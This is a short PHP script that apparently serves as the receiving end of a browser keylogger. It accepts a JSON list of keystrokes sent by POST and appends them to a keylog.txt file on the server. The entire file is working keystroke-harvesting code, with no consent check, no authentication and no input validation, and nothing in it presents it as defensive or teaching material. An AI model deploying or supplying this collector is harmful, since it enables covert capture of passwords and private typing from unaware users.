<?php
// (A) OPEN KEYLOG FILE, APPEND MODE
$file = fopen("keylog.txt", "a+");

// (B) SAVE KEYSTROKES
$keys = json_decode($_POST["keys"]);
foreach ($keys as $k=>$v) {
    if ($v === "\nEnter\n") {
        fwrite($file, "\n");
    } else {
        fwrite($file, $v);
    }
}

// (C) CLOSE & END
fclose($file);
echo "OK";
?>
